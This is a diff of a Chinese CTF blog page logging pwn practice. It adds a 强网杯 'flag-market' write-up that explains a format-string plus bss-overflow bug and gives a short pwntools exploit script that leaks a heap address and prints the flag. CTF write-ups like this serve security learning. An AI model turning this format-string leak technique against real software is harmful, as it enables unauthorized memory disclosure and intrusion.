@@ -29,8 +29,10 @@
 <meta property="og:description" content="ctfshow、buu、polar、pwnable靶场的pwn刷题记录">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="http://example.com/images/image-20251118213518519.png">
+<meta property="og:image" content="http://example.com/images/image-20251129213339232.png">
+<meta property="og:image" content="http://example.com/2025/04/27/images/image-20251129213700882.png">
 <meta property="article:published_time" content="2025-04-27T07:53:32.002Z">
-<meta property="article:modified_time" content="2025-11-22T12:01:27.046Z">
+<meta property="article:modified_time" content="2025-12-19T10:57:52.643Z">
 <meta property="article:author" content="leon">
 <meta property="article:tag" content="pwn">
 <meta property="article:tag" content="heap">
@@ -116,7 +118,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#ctfshow"><span class="nav-number">1.</span> <span class="nav-text">ctfshow</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#pwn70-%E4%B8%8D%E5%8F%AF%E8%A7%81%E5%AD%97%E7%AC%A6"><span class="nav-number">1.1.</span> <span class="nav-text">pwn70 不可见字符</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E4%B8%8D%E5%8F%AF%E6%89%93%E5%8D%B0%E5%AD%97%E7%AC%A6%E7%9A%84%E5%88%86%E7%B1%BB"><span class="nav-number">1.1.1.</span> <span class="nav-text">1. 不可打印字符的分类</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E4%B8%8D%E5%8F%AF%E6%89%93%E5%8D%B0%E5%AD%97%E7%AC%A6%E7%9A%84ASCII%E7%A0%81"><span class="nav-number">1.1.2.</span> <span class="nav-text">2. 不可打印字符的ASCII码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF"><span class="nav-number">1.1.3.</span> <span class="nav-text">3. 应用场景</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pwn162"><span class="nav-number">1.2.</span> <span class="nav-text">pwn162</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pwn164"><span class="nav-number">1.3.</span> <span class="nav-text">pwn164</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#polar%E9%9D%B6%E5%9C%BA"><span class="nav-number">2.</span> <span class="nav-text">polar靶场</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#sandbox"><span class="nav-number">2.1.</span> <span class="nav-text">sandbox</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#creeper"><span class="nav-number">2.2.</span> <span class="nav-text">creeper</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#hahaha"><span class="nav-number">2.3.</span> <span class="nav-text">hahaha</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#cat"><span class="nav-number">2.4.</span> <span class="nav-text">cat</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#buu"><span class="nav-number">3.</span> <span class="nav-text">buu</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#rip"><span class="nav-number">3.1.</span> <span class="nav-text">rip</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#warmup-csaw-2016"><span class="nav-number">3.2.</span> <span class="nav-text">warmup_csaw_2016</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ciscn-2019-n-1"><span class="nav-number">3.3.</span> <span class="nav-text">ciscn_2019_n_1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pwn1-sctf-2016"><span class="nav-number">3.4.</span> <span class="nav-text">pwn1_sctf_2016</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level0"><span class="nav-number">3.5.</span> <span class="nav-text">level0</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B42019-%E5%86%B3%E8%B5%9B-PWN5"><span class="nav-number">3.6.</span> <span class="nav-text">[第五空间2019 决赛]PWN5</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#jarvisoj-level2"><span class="nav-number">3.7.</span> <span class="nav-text">jarvisoj_level2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ciscn-2019-n-8"><span class="nav-number">3.8.</span> <span class="nav-text">ciscn_2019_n_8</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#bjdctf-2020-babystack"><span class="nav-number">3.9.</span> <span class="nav-text">bjdctf_2020_babystack</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ciscn-2019-c-1"><span class="nav-number">3.10.</span> <span class="nav-text">ciscn_2019_c_1</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%B6%E8%8E%B7"><span class="nav-number">3.10.1.</span> <span class="nav-text">收获</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#jarvisoj-level2-x64"><span class="nav-number">3.11.</span> <span class="nav-text">jarvisoj_level2_x64</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ciscn-2019-s-3"><span class="nav-number">3.12.</span> <span class="nav-text">ciscn_2019_s_3</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#pwnable"><span class="nav-number">4.</span> <span class="nav-text">pwnable</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#start"><span class="nav-number">4.1.</span> <span class="nav-text">start</span></a></li></ol></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#ctfshow"><span class="nav-number">1.</span> <span class="nav-text">ctfshow</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#pwn70-%E4%B8%8D%E5%8F%AF%E8%A7%81%E5%AD%97%E7%AC%A6"><span class="nav-number">1.1.</span> <span class="nav-text">pwn70 不可见字符</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E4%B8%8D%E5%8F%AF%E6%89%93%E5%8D%B0%E5%AD%97%E7%AC%A6%E7%9A%84%E5%88%86%E7%B1%BB"><span class="nav-number">1.1.1.</span> <span class="nav-text">1. 不可打印字符的分类</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E4%B8%8D%E5%8F%AF%E6%89%93%E5%8D%B0%E5%AD%97%E7%AC%A6%E7%9A%84ASCII%E7%A0%81"><span class="nav-number">1.1.2.</span> <span class="nav-text">2. 不可打印字符的ASCII码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF"><span class="nav-number">1.1.3.</span> <span class="nav-text">3. 应用场景</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pwn162"><span class="nav-number">1.2.</span> <span class="nav-text">pwn162</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pwn164"><span class="nav-number">1.3.</span> <span class="nav-text">pwn164</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#polar%E9%9D%B6%E5%9C%BA"><span class="nav-number">2.</span> <span class="nav-text">polar靶场</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#sandbox"><span class="nav-number">2.1.</span> <span class="nav-text">sandbox</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#creeper"><span class="nav-number">2.2.</span> <span class="nav-text">creeper</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#hahaha"><span class="nav-number">2.3.</span> <span class="nav-text">hahaha</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#cat"><span class="nav-number">2.4.</span> <span class="nav-text">cat</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#buu"><span class="nav-number">3.</span> <span class="nav-text">buu</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#rip"><span class="nav-number">3.1.</span> <span class="nav-text">rip</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#warmup-csaw-2016"><span class="nav-number">3.2.</span> <span class="nav-text">warmup_csaw_2016</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ciscn-2019-n-1"><span class="nav-number">3.3.</span> <span class="nav-text">ciscn_2019_n_1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pwn1-sctf-2016"><span class="nav-number">3.4.</span> <span class="nav-text">pwn1_sctf_2016</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level0"><span class="nav-number">3.5.</span> <span class="nav-text">level0</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B42019-%E5%86%B3%E8%B5%9B-PWN5"><span class="nav-number">3.6.</span> <span class="nav-text">[第五空间2019 决赛]PWN5</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#jarvisoj-level2"><span class="nav-number">3.7.</span> <span class="nav-text">jarvisoj_level2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ciscn-2019-n-8"><span class="nav-number">3.8.</span> <span class="nav-text">ciscn_2019_n_8</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#bjdctf-2020-babystack"><span class="nav-number">3.9.</span> <span class="nav-text">bjdctf_2020_babystack</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ciscn-2019-c-1"><span class="nav-number">3.10.</span> <span class="nav-text">ciscn_2019_c_1</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%B6%E8%8E%B7"><span class="nav-number">3.10.1.</span> <span class="nav-text">收获</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#jarvisoj-level2-x64"><span class="nav-number">3.11.</span> <span class="nav-text">jarvisoj_level2_x64</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ciscn-2019-s-3"><span class="nav-number">3.12.</span> <span class="nav-text">ciscn_2019_s_3</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#pwnable"><span class="nav-number">4.</span> <span class="nav-text">pwnable</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#start"><span class="nav-number">4.1.</span> <span class="nav-text">start</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%BC%BA%E7%BD%91%E6%9D%AF"><span class="nav-number">5.</span> <span class="nav-text">强网杯</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#flag-market"><span class="nav-number">5.1.</span> <span class="nav-text">flag-market</span></a></li></ol></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -131,7 +133,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">35</span>
+          <span class="site-state-item-count">33</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -213,7 +215,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2025-11-22 20:01:27" itemprop="dateModified" datetime="2025-11-22T20:01:27+08:00">2025-11-22</time>
+      <time title="Modified: 2025-12-19 18:57:52" itemprop="dateModified" datetime="2025-12-19T18:57:52+08:00">2025-12-19</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -239,14 +241,14 @@
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">Word count in article: </span>
-      <span>13k</span>
+      <span>14k</span>
     </span>
     <span class="post-meta-item" title="Reading time">
       <span class="post-meta-item-icon">
         <i class="far fa-clock"></i>
       </span>
       <span class="post-meta-item-text">Reading time &asymp;</span>
-      <span>12 mins.</span>
+      <span>13 mins.</span>
     </span>
 </div>
 
@@ -518,6 +520,14 @@
 
 
 
+<h1 id="强网杯"><a href="#强网杯" class="headerlink" title="强网杯"></a>强网杯</h1><h2 id="flag-market"><a href="#flag-market" class="headerlink" title="flag-market"></a>flag-market</h2><p><img data-src="/../images/image-20251129213339232.png" alt="image-20251129213339232">由上图可知存在格式化字符串。flag在堆上，通过栈中留下的一个地址刚好是堆地址，程序输出过flag后可由<code>find &quot;flag&#123;&quot;</code>查到flag在堆中的偏移如下：</p>
+<img data-src="../images/image-20251129213700882.png" alt="image-20251129213700882" style="zoom:67%;" />
+
+<p><strong>思路：</strong></p>
+<p>开启时读取flag并将stream放在栈上，这是一个堆地址，进去发现flag在堆上</p>
+<p>输入255时会scanf读取到bss上有溢出，此时发现该位置下面便是printf参数所在地址，将printf参数覆盖成格式化字符串，泄露堆地址。</p>
+<p>flag在堆上，直接找到位置，通过栈变量<code>s</code>给它放到栈上，通过%s泄露出来即可</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">sla(<span class="string">b&#x27;2.exit\n&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;pay?\n&#x27;</span>, <span class="string">b&#x27;255&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&#x27;report:\n&#x27;</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x100</span> + <span class="string">b&#x27;+%9$p-%12$s&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;2.exit\n&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">sa(<span class="string">b&#x27;pay?\n&#x27;</span>, p64(<span class="number">0x4040c0</span>))</span><br><span class="line"></span><br><span class="line">flag = int16(p.recvuntil(<span class="string">b&#x27;-&#x27;</span>,<span class="literal">True</span>).decode()) + <span class="number">0x1e0</span></span><br><span class="line"></span><br><span class="line">leak(<span class="string">&#x27;flag&#x27;</span>,flag)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&#x27;2.exit\n&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">sa(<span class="string">b&#x27;pay?\n&#x27;</span>, p64(flag))</span><br><span class="line"></span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>
 
     </div>
 
@@ -590,13 +600,13 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-line"></i>
     </span>
-    <span title="Word count total">602k</span>
+    <span title="Word count total">607k</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="Reading time total">9:08</span>
+    <span title="Reading time total">9:12</span>
   </span>
 </div>
 <div class="busuanzi-count">
